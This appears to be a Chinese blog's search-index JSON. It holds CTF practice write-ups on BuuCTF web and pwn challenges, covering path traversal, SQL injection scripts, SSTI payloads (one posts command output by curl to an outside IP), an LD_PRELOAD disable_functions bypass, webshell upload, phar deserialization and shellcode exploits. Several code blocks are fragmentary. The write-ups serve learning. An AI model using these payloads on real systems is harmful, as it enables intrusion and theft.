{"pages":[{"title":"About","text":"关于我华工大三信安专业在读, 熟练使用C-c C-v编程 常用ID cjM00N or 月亮 目前为Kap0k战队Web手, NS玩家 , 吉他初学者, 职业递茶玩家 以及单身 联系方式Email: Y2ptMDBuQHFxLmNvbQ==or 评论均可","link":"/about/index.html"},{"title":"Friends","text":"给大哥们递茶.gif Verhttps://vergissmeinnichtz.github.io/ 三线程霸主, 日常AK密码的五边形选手 C0mRaDehttps://coomrade.github.io/ Web大哥, Kap0k灵魂支柱 Byzerohttps://www.zerocre.com/ Pwn爷爷 Q4nhttps://q4n.github.io/ 年轻的Pwn爷爷 Sjoshuahttp://sforest.in/ MISC霸主, ACM&CTF双修选手, 渗透Uppp","link":"/friends/index.html"}],"posts":[{"title":"BuuCTF刷题记录","text":"感谢glzjin师傅 [HCTF 2018]WarmUp这是CISCN2019华南赛区半决赛的题目…当时没做出来 太菜了 题目源自 CVE-2018-12613 源码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849\"source.php\",\"hint\"=>\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) && is_string($_REQUEST['file']) && emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\"; } ?> 这里可以看到, 有is_string的判断, 数组绕过是不可行的, 只能绕过checkFile, 而checkFile里面有二次urldecode, 这给我们提供了机会, 如果我传一个 1?file=source.php%253f 其中%253f是?的二次编码, 这样既可绕过前面的检测, 那么接下来就是使用目录穿越了 先访问hint.php, 可以看到 1flag not here, and flag in ffffllllaaaagggg 这里有个知识点是, 当二重编码时, 这里的source.php相当于一个目录, 也就是说我们位于 12location: /var/www/html/source.php/flag: /ffffllllaaaagggg 所以4次目录穿越, payload如下 1?file=source.php%253f/../../../../ffffllllaaaagggg 或者不用判断多少直接多来几个/../也可以 最终payload 1?file=source.php%253f/../../../../ffffllllaaaagggg [强网杯 2019]随便注解题一fuzz之后发现过滤了select 上网找找有没有能绕过select的方法, 查到了堆叠过滤, 简单测一下, 我们先输入一个复合语句 11';show tables; 可以看到输出正常, 说明后端的实现应该是 1mysqli_multi_query($sql); 而平时的实现是mysql_query这样的语句可以支持多条sql语句同时执行, 那要绕过select的过滤的话可以使用 1set @t=0x68616861686168;prepare x from @t;execute x; 预编译语句来执行, 其中@t的部分是执行语句的hex编码, 例如我们要执行 1select * from `1919810931114514`; hex编码后替换上面的aaaaa即可 解题二这里其实已经有了一个select, 那我们如果利用这个来查询的话就可以直接查询flag了 先查看一下两个表的结构, 表名我们前面已经查出来了 11';show columns from words; 有两个列, 一个是id另一个是data, 明显id就是查询的索引, 所以先重命名两个表 1RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;# 可以给表增加一个id列或者直接将flag列改成id列, 然后万能密码 11' or 1=1# 查出flag GetFlag最终payload如下 11';Set @t=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;Prepare x from @t; Execute x; [强网杯 2019]高明的黑客强网杯的题目, 拉下来有3001个混淆过的php, 随便打开后可以看到有输出 回来看一下源码, 可以看到有许多get或者post的参数, 并且有eval, system, assert等系统函数, 但是大部分都赋值或者无法使用 当时比赛的时候还傻乎乎的用phpstorm去一行行跟过, 这题主要考察的是fuzz的想法, 通过对这些文件进行fuzz来查找可以使用的参数, 首先需要启动php服务, 在win下我们使用phpstudy直接开就可以了, linux下直接 1php -S 0:8080 即可访问, 然后是通过正则去匹配传入的参数名 1(?","link":"/2020/02/14/BuuCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"title":"BuuCTF刷题记录2","text":"感谢glzjin师傅 [WesternCTF2018]shrine首先看题目 1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) WAF只有过滤()和设置config以及self为空, 而我们可以看到flag在app.config里面, 这里参考 https://www.jianshu.com/p/1237c78a691c 没有了直接的config, 我们可以通过current_app来获取, 通过查阅手册, 可以发现在函数url_for中存在这个变量 那么就可以通过下面的payload来获取 1{{url_for.__globals__['current_app'].config}} 同样的函数还有get_flashed_messages 或者使用 1{{app.__init__.__globals__.sys.modules.app.app.__dict__}} 国外大佬的方法就比较硬核了 https://ctftime.org/writeup/10851 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# search.pydef search(obj, max_depth): visited_clss = [] visited_objs = [] def visit(obj, path='obj', depth=0): yield path, obj if depth == max_depth: return elif isinstance(obj, (int, float, bool, str, bytes)): return elif isinstance(obj, type): if obj in visited_clss: return visited_clss.append(obj) print(obj) else: if obj in visited_objs: return visited_objs.append(obj) # attributes for name in dir(obj): if name.startswith('__') and name.endswith('__'): if name not in ('__globals__', '__class__', '__self__', '__weakref__', '__objclass__', '__module__'): continue attr = getattr(obj, name) yield from visit(attr, '{}.{}'.format(path, name), depth + 1) # dict values if hasattr(obj, 'items') and callable(obj.items): try: for k, v in obj.items(): yield from visit(v, '{}[{}]'.format(path, repr(k)), depth) except: pass # items elif isinstance(obj, (set, list, tuple, frozenset)): for i, v in enumerate(obj): yield from visit(v, '{}[{}]'.format(path, repr(i)), depth) yield from visit(obj) 修改的app.py 123456789101112131415161718192021import flaskimport osfrom flask import requestfrom search import searchapp = flask.Flask(__name__)app.config['FLAG'] = 'TWCTF_FLAG'@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/')def shrine(shrine): for path, obj in search(request, 10): if str(obj) == app.config['FLAG']: return pathif __name__ == '__main__': app.run(debug=True) 通过遍历request来查找是否存在某个子属性和app.config['FLAG']是一致的, 最后找的payload是 1{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}} 其实可以看到和前面的思路是一致的, 只是获取的路径不同 [GWCTF 2019]你的名字顺带就来做一下上次比赛没整出来的SSTI 这道题其实很明显的是模板注入, 出题人恶趣味的用了index.php这样的路由, 但是实际上还是一道python题 先来fuzz一下 当输入为class的时候, 结果会被过滤, 应该是有waf 用6测一下发现还有php的报错, 这是真的sxbk 但是这里是用不了了 我们上网查一下就会发现, 在ssti中过滤了后, 可以通过{\\%外带 Python模板注入(SSTI)深入学习 上面链接中的payload改一下就可以用 1{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`ls /`') %}1{% endif %} 但是还有一个问题是有关键字符的过滤, 上网找一下ssti的字典 当然是没找到了 可以发现双写绕不过, 应该是循环匹配, 替换为空的话我们可以利用这个特点来绕过, 但是这里毫无提示, 感觉只能纯靠猜, 找到一个词符合以下条件 在ban_list中尽量靠后 不出现在我们的payload里面 由于第一个是黑箱, 我们只能从第二个入手 fuzz脚本 12345678910111213141516171819202122232425262728293031323334353637import reimport requestsfrom time import sleepurl = \"http://f9fd3c30-c575-4a29-88a3-680ebc168df5.node3.buuoj.cn\"def gen_words(): f = open(\"ssti_payload.txt\", \"r\").read() words = re.findall(\"[a-zA-Z]+\", f) f = open(\"ssti_word.txt\", \"w\") res = sorted(list(set(words))) for i in res: f.write(i + \"\\n\") return resdef find_unused_word(words, payload): used_word = list(set(re.findall(\"[a-zA-Z]+\", payload))) return [i for i in words if i not in used_word]def fuzz(): payload = \"{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`ls /`') %}1{% endif %}\" words = gen_words() unused_word = find_unused_word(words, payload) for i in unused_word: data = { \"name\": i } res = requests.post(url, data=data).text if \"hello !\" in res: data = { \"name\": \"cla\" + i + \"ss\" } res = requests.post(url, data=data).text if \"class\" in res: print(f\"[*] find {i}\") sleep(0.1)if __name__ == \"__main__\": fuzz() 由于结果只有几个, 我们挨个试一下, 就会发现config是可用的 使用小号开一个Linux labs 之后再改造一下payload 1{% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://174.0.167.222:2333/ -d `ls /|base64`') %}1{% endiconfigf %} 注意这里最后必须要是endiconfigf, 不是很懂为什么, 猜测是要和前面的iconfigf一致吧, 其他的情况都会导致打不通 然后我们就可以rce了, 由于返回只有一行, 就拼接了个|base64 [SWPU2019]Web1这题咋一看还以为是个XSS—- 但是这管理员一直不确认的就很迷惑了 然后查了一下才发现不是XSS是个SQL题 可以看到注入点有几个, 比如申请广告这里 还有查看的时候 测试一下发现id那里打不通, 就回到广告这里, 顺利的看到了注入点 当然这丧心病狂的22列是真的顶 首先可以看到被过滤, 直接使用/**/或者(就可以绕过了, 主要是下面两点 Bypass information_schema做过sqli的都知道这个库的厉害, 但是现在也经常被过滤 (例如过滤or), 那么我们就需要新的姿势了 https://www.anquanke.com/post/id/193512 https://www.cnblogs.com/wangtanzhi/p/12241499.html 可以看到大部分是用了sys.schema_auto_increment_columns这个库 由于在Buuoj上面没有这个库, 这里用的姿势是 1-1'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 这样来获取表名 无列名注入先回顾一下我们常规的思路, 一般我们是通过information_schema.columns注入出所有列名再进行查询, 而这里我们用不了这个库, 就可以考虑无列名注入 1select 1,2,3; 此时可以看到列名分别为1,2,3 1select 1,2,3 union select * from users; 这里可以看到我们通过union连接来改变原来的列名, 所以我们可以通过 1select `2` from (select 1,2,3 union select * from users)x; 这里有几个注意的点 列名用反引号, 这里因为是数字, 我们需要使用反引号包起来, 如果不用的话会全部变成2 子select要用()包起来 子select最后要赋予一个别名, 不然会报错 然后我们就可以注入了 12-1'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 我现在才发现select*from users是成立的, 中间不需要用空格…. 然后就可以拿flag了 [CISCN 2019 初赛]Love Math这道题蛮有意思的, 先看代码 12345678910111213141516171819202122232425262728= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';');} 代码中做了三个判断 长度必须小于80 过滤一部分符号 1' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]' 匹配所有函数变量名必须在$whitelist中, 比如pi 这个正则来源可以见 https://www.php.net/manual/zh/language.variables.basics.php 其实第一个是最难的hhhh 看一下手册就可以看到, 有个函数很特别 这个返回值是string就很妙了, 那么我们可以通过这样的方法来转换出我们需要的字符 123$command = \"phpinfo\";echo base_convert($command,36,10);# >:55490343972 这样就能得到一个纯数字, 然后通过 1base_convert(55490343972,10,36)(); 就可以执行了 然后同理我们可以拼出 12base_convert(1751504350,10,36)(base_convert(784,10,36));# system(ls) 但是读文件就比较困难了, base_convert只能转换[a-z0-9], 而读文件需要空格, 本题的flag在/flag, 那就势必需要能够转换特殊字符的函数了, 这里有两个思路 hex2bin先看一下手册 这个函数可以实现将Hex转换成字符串, 也就是 但是这样会出现字母, 本地先转换成10进制, 然后在payload使用dechex转换回去就可以了, 具体操作如下 123base_convert(696468,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))# system(hex2bin(dechex(1819484207)))# system('ls /') 当然想法很好, 长度却不够了, 这里的替换思路有两个, 一个是将system换成exec, 并更改进制来尽量减少位数, 只要不出现字母就可以了 12base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(1819484207)))# exec('ls /') 刚好79, 可以执行 但是没有全部返回hhh, 这里知道是在/flag, 就可以直接打, 不过命令也是比较取巧 12base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260451114)))# exec('nl /*') 另外一种就是构造$_GET, 然后就可以为所欲为了hhhh 1234$pi=base_convert(3761671484,13,36)(dechex(1598506324));$$pi{0}($$pi{1})# $pi=hex2bin(dechex(1598506324));# $pi=_GET# $$pi=$_GET 这里利用的是php的可变变量特性 剩下的就显而易见了 从其他位置获取参数可以在 https://xz.aliyun.com/t/4906#toc-8 中看到ROIS使用的payload是 12$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})# system(getallheaders(){9}) 实测的时候一直没有打通, 研究了一下发现这个payload需要在apache环境下 buu上是用nginx, 所以打不通, 其他的类似函数因为长度问题用不了, 就当了解一下了 [极客大挑战 2019]RCE ME参考 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 这个过滤的话很明显就能想到p神上面那篇文章, 直接取反就可以绕过了, 然后我们想办法执行, 先看一下phpinfo() 1(~%8F%97%8F%96%91%99%90)(); 然后是disable_function 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl 可以看到mail没有被禁, 那么我们待会就可以用来绕过 这里的话我们只能够拼接assert而不能拼接eval, 这是由php的特性决定的 然后看一下环境是在Apache下, 那么有一说一还是getallheaders舒服 参考 https://evoa.me/index.php/archives/62/ 12(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));# assert(next(getallheaders())); 然后在User-Agent输入命令即可 为了Bypass disable_function, 先让蚁剑连上来, 写shell 1User-Agent: print_r(file_put_contents(\"/tmp/a.php\",'')) 然后包含 1User-Agent: include(\"/tmp/a.php\"); 蚁剑就可以连上来了 这里先提供一个懒人方法 使用蚁剑的插件 就可以直接绕过了hhh, 当然我们不能这样, 还是要一步一步来 推荐以下两篇文章 https://www.anquanke.com/post/id/175403 https://www.freebuf.com/articles/web/192052.html 无论学什么都能在一叶飘零师傅的文章中找到.jpg 我们知道如果要加载LD_PRELOAD需要新起进程, 在php解释器运行中, 第一次执行execve是调用php解释器, 如果出现第二个execve就是有新进程的生成, 这里的测试php如下 12&1|grep -C3 execve 可以看到确实出现了多个execve, 同样的函数还有imap_open 这里我就直接使用了前面链接中的文件 首先是exp.c 123456789101112131415161718192021222324252627#define _GNU_SOURCE#include #include #include extern char** environ;__attribute__ ((__constructor__)) void preload (void){ // get command line options and arg const char* cmdline = getenv(\"EVIL_CMDLINE\"); // unset environment variable LD_PRELOAD. // unsetenv(\"LD_PRELOAD\") no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \"LD_PRELOAD\")) { environ[i][0] = '\\0'; } } // executive command system(cmdline);} 在linux中编译 1gcc -shared -fPIC exp.c -o exp_x64.so exp.php 12345678910111213141516171819 然后通过蚁剑一起上传上去, 带上参数访问即可 不用蚁剑的话可以通过开另一台linux_lab来传 1copy(\"http://ip:port/exp.so\",\"/tmp/exp.so\"); 方法很多, 蚁剑是比较方便的方法 [SUCTF 2019]EasyWeb源码如下 123456789101112131415161718192021222324252627282930313233343536373818){ die('One inch long, one inch strong!');}if ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);if(strlen($character_type)>12) die(\"Almost there!\");eval($hhh);?> 绕过正则首先有长度和正则的过滤, 我们需要先想办法构造一个$_GET出来, fuzz一下特殊符号, 发现还有^, 那大概就是异或来绕过正则了, 而我们在下面还可以看到有个 1$character_type = count_chars($hhh, 3); 也就是说我们不能使用超过12种字符 那先用脚本构造一下 1234567891011121314151617181920import repattern = re.compile('[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+', re.I)payload = \"_GET\"for i in range(1, 256): if pattern.match(chr(i)): continue res = f\"%{i:02x}\" * len(payload) res += \"^\" f = False for j in payload: new = ord(j)^i if pattern.match(chr(new)): f = True break res += f\"%{ord(j)^i:02x}\" if f: continue print(res) 然后从输出中随便选一个来构造 1${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo 文件上传这里其实就是让你去调用get_the_flag() 那么我们来康康这个函数干啥 1234567891011121314function get_the_flag(){ ... if(!empty($_FILES[\"file\"])){ $tmp_name = $_FILES[\"file\"][\"tmp_name\"]; $name = $_FILES[\"file\"][\"name\"]; $extension = substr($name, strrpos($name,\".\")+1); if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); if(mb_strpos(file_get_contents($tmp_name), ' start: if attack(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.02) flag += chr(mid) print(flag)if __name__ == \"__main__\": # try_length() main() 然后就能注出密码 登陆后可以看到有个文件上传点 上传后提示会记录文件名, 并且log文件为php格式, 但是由于存在/php/i的过滤, 使用短标签绕过 1 后面就直接cat /flag [HITCON 2017]SSRFme12345678910111213141516171819 () = => like 然后就可以顺利注出表名和列名 1-1'^(updatexml(1,concat(0x7e,(SELECT(group_concat(column_name))from(information_schema.columns)where((table_schema)like(database()))),0x7e),1))^'1 这里可以看到在拿flag的时候出现了长度不够 1-1'^(updatexml(1,concat(0x7e,(SELECT((group_concat(password)))from(H4rDsq1)),0x7e),1))^'1 加上个reverse即可 1-1'^(updatexml(1,concat(0x7e,(SELECT(reverse(group_concat(password)))from(H4rDsq1)),0x7e),1))^'1 手动拼接即可得到flag [LCTF 2018]bestphp’s revengeindex.php 123456789101112 flag.php 1234567session_start();echo 'only localhost can get flag!';$flag = 'LCTF{*************************}';if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"){ $_SESSION['flag'] = $flag; }only localhost can get flag! 源码如上, 大概的想法是通过 1call_user_func($_GET['f'], $_POST); 这一行进行变量覆盖, 然后在最后一行执行代码 首先尝试将$b覆盖成var_dump 但是这里失败了, 不太懂为什么没有覆盖成功 查了一下相应的wp, 也是用的extract, 这就很迷了 lctf2018-bestphps-revenge-详细题解 推荐一下smi1e师傅的wp, 以下直接引用部分 我们可以看到代码中的session_start()十分突兀, 可以说没有啥用, 那应该就是突破口, 在php中, session的存储位置是在文件中, 并且有一次反序列化的过程, 这就有了session反序列化的漏洞 php的反序列化引擎有三种 php: 1name|s:5:\"Smi1e\"; php_serialize: 1a:1:{s:4:\"name\";s:5:\"Smi1e\";} php_binary: 1names:5:\"Smi1e\"; 可以看到不同的引擎的反序列化方式不同, 类似于反序列化字符串逃逸, 如果使用了不同的引擎, 也可能出现反序列化逃逸, 例如 1a:1:{s:4:\"name\";s:5:\"|O:5:\"Smi1e\":1:{s:4:\"test\";s:3:\"AAA\";}\";} 在php引擎中会从|分隔, a:1:{s:4:\"name\";s:5:\"作为key, O:5:\"Smi1e\":1:{s:4:\"test\";s:3:\"AAA\";}\";}作为value, 最后会把它进行unserialize处理, 这就出现了漏洞 但是空有漏洞也没有用, 我们需要对flag.php进行ssrf, 由于题目没有类对象, 我们需要从原生的类入手 https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0 可以看到SoapClient类就符合这个特点, 所以这里的思路就是 生成SoapClient的payload 先设置为php_serialize引擎, 将payload注入 再次访问, 调用SoapClient类中不存在的方法, 触发__call__, 从而实现ssrf 一步步来, 首先是生成payload 123456 $path, 'location' => $path)); $payload = serialize($o); echo \"|\".$payload; 生成 1|O:10:\"SoapClient\":4:{s:3:\"uri\";s:25:\"http://127.0.0.1/flag.php\";s:8:\"location\";s:25:\"http://127.0.0.1/flag.php\";s:15:\"_stream_context\";i:0;s:13:\"_soap_version\";i:1;} 然后访问 再利用call_user_func的特性, 当传入的第一个参数为数组时, 数组的第一个元素作为类名, 第二个元素为方法 这里的访问就是 1call_user_func(array(\"SoapClient\", \"welcome_to_the_lctf2018\")); 就会触发__call__, 实现ssrf 最后访问index.php, 将获取到的session填入cookie即可 签到题都这么有水平, lctf太顶了 [RoarCTF 2019]Online Proxy 可以看到有ip, 那么有几种可能 SSTI 命令注入 sql注入 结合文字应该就是sql注入了, 不过这里注入的情况比较特别, 需要三次访问才会出结果 访问, 程序记录IP 第二次访问, 如果不同, 则将上次的IP放入数据库 第三次访问, 如果与第二次相同, 则从数据库查询上次的IP 这就是二次注入了, 脚本如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import requestsimport refrom time import sleepurl = \"http://node3.buuoj.cn:25528/\"proxies = { \"http\": \"127.0.0.1:8080\"}static_headers = { \"X-Forwarded-For\": \"111\",}session = requests.Session()def test(cur, mid): # table: F4l9_D4t4B45e payload = \"-1' and (ascii(substr((select reverse(group_concat(schema_name)) from information_schema.schemata),%d,1))>%d)^'0\" % (cur, mid) # table: F payload = \"-1' and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='F4l9_D4t4B45e'),%d,1))>%d)^'0\" % (cur, mid) payload = \"-1' and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='F4l9_D4t4B45e'),%d,1))>%d)^'0\" % (cur, mid) payload = \"-1' and (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),%d,1))>%d)^'0\" % (cur, mid) headers = { \"X-Forwarded-For\": payload, } res = session.get(url, headers=headers, timeout=5) res = session.get(url, headers=static_headers, timeout=5) res = session.get(url, headers=static_headers, timeout=5).text # print(res) result = re.findall(\"(?%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(reverse(group_concat(table_name)))from(information_schema.tables)),%d,1))>%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(reverse(group_concat(column_name)))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)\" % (cur, mid) res = session.get(f\"{url}?id={payload}\", timeout=5).text if \"Click\" in res: return True return False # print(result)def main(): flag = \"\" for i in range(172, 220): end = 127 start = 31 mid = (end + start) // 2 while end > start: if test(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.05) flag += chr(mid) print(flag)if __name__ == \"__main__\": # attack() # test() main() [ByteCTF 2019]EZCMS第一步是hash拓展攻击 先随便登录一下, 可以在cookie中看到 1hash=52107b08c0f3342d2153ae1d68e6262c 翻一下源码, 这里是 12$secret = \"E3ry7Hjq\";setcookie(\"hash\", md5($secret.\"adminadmin\")); 在验证的地方, 验证 1234567891011function is_admin(){ $secret = \"E3ry7Hjq\"; $username = $_SESSION['username']; $password = $_SESSION['password']; if ($username == \"admin\" && $password != \"admin\"){ if ($_COOKIE['user'] === md5($secret.$username.$password)){ return 1; } } return 0;} 那么只需要在hashpump里面 然后替换成% 1admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin 登陆后就是admin了 然后继续看源码, 这道题不难看出是个构造pop链的题, 可以看到在config.php里面 File类存在一个__destruct 里面会调用check->upload_file 在Profile类中存在一个__call函数, 可以调用admin->open, 那么如果我们能找到某个类的open可以删除文件, 也就是程序默认生成的.htaccess, 就可以RCE了, 这个类就是ZipAchrive https://www.anquanke.com/post/id/95896#h2-4 现在，我们在本地去测试每个类的行为。经过一段时间的测试之后，我发现，ZipArchive->open方法可以删除目标文件，前提是我们需要将其第二个参数设定为“9”。 为什么要设定为9呢？原因在于， ZipArchive->open()的第二个参数是“指定其他选项”。而9对应的是ZipArchive::CREATE | ZipArchive::OVERWRITE。由于ZipArchive打算覆盖我们的文件，所以就会先对其进行删除。在此，感谢@pagabuc帮助我们解释了这一参数的具体意义。 那么现在，我们就可以使用ZipArchive->open()来删除.htaccess文件。 构造链如下 1File -> __destruct -> Profile -> upload_file(不存在) -> __call -> ZipArchive -> open 生成的脚本 123456789101112131415161718192021222324252627282930313233343536373839admin = $z;$f = new File();$f->checker = $p;unlink(\"1.phar\");$phar = new Phar(\"1.phar\"); //后缀名必须为phar$phar->startBuffering();// setStub(\"GIF89a\" . \"\"); //设置stub$phar->setMetadata($f); //将自定义的meta-data存入manifest$phar->addFromString(\"test.txt\", \"test\"); //签名自动计算$phar->stopBuffering(); 对于如何绕过phar协议的过滤可以看这篇文章 https://blog.zeddyu.info/2019/08/24/SUCTF-2019/#php-filter zedd师傅的文章都写的很好 通过php伪协议来绕过 1php://filter/read=convert.base64-encode/resource=phar:// 而这里恰好有一个触发的函数 那么就可以开始了 生成webshell, 由于eval无法动态构造, 这里就直接这样了 123 上传webshell 生成我们的phar文件并上传 访问view.php, 这里需要注意phar文件的路径 1http://078e3606-5996-4c33-9dff-00db1aaa228f.node3.buuoj.cn/view.php?filename=eec2d95bc618625503306c10fad5d37d.phar&filepath=php://filter/resource=phar://./sandbox/2c67ca1eaeadbdc1868d67003072b481/eec2d95bc618625503306c10fad5d37d.phar rce [BJDCTF2020]Cookie is so stable这道题以为他用的是smarty, 还以为他的这句话是用了waf 测了半天发现不靠谱, 原来这是个twig 上网抄个payload就可以直接打了…. 具体可以看这里 一篇文章带你理解漏洞之SSTI漏洞 1{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag\")}} 果然还是要测一测是什么引擎先 [BJDCTF2020]EasySearch123456789101112131415161718192021222324252627282930313233343536 跑(抄)出来的md5是 12020666 后面利用的是apache的ssi漏洞注入 SSI注入漏洞总结 flag在上一层 [BJDCTF2020]EzPHP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 绕过 1preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING']) url编码即可 绕过 1234if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { $file = $_GET[\"file\"]; echo \"Neeeeee! Good Job!\"; } 因为正则没有/g, 添加一个%0a就可以绕过了 绕过 123456if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); } } 这里的话是利用POST参数来覆盖GET参数, 我们知道POST和GET的参数是分别放在不同的数组的, 但是在$_REQUEST中, 是合并在一起的, 并且优先级如下 1GETb.txt\")); 第二篇结束了, 后面尽量刷一些质量更高的题吧 本文作者: cjm00n本文地址: https://cjm00n.top/2020/02/14/BuuCTF刷题记录2/ 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。","link":"/2020/02/14/BuuCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/"},{"title":"Buu刷题记录3","text":"更新中 [ISITDTU 2019]EasyPHP先看源码 index.php123456789101112 ret 也就是-0x80-0x8, payload如下 12345678from pwn import *io = remote(\"node3.buuoj.cn\",26279)io.recvline()payload = b\"a\" * 0x88payload += p64(0x400596)io.send(payload)io.interactive() jarvisoj_level1 可以看到没有开NX堆栈保护, main函数如下 跟进vulenrable_function 这次没有了后门函数, 但是NX保护没开, 就可以将shellcode写入堆栈, 再将地址指向堆栈上shellcode的地址, 就可以执行了, buf的大小为0x8c 想法是很美好的, buuoj上面却一直打不通, 感觉上面的文件和给的附件不一样, 打了一下jarvisoj的可以通 123456789101112131415from pwn import *io = remote(\"node3.buuoj.cn\",27940)# io = remote(\"pwn2.jarvisoj.com\",\"9877\")context.log_level = 'debug'addr = int(io.recvline()[len(\"What's this:\"):-2],16)print(addr)shellcode = asm(shellcraft.sh())# 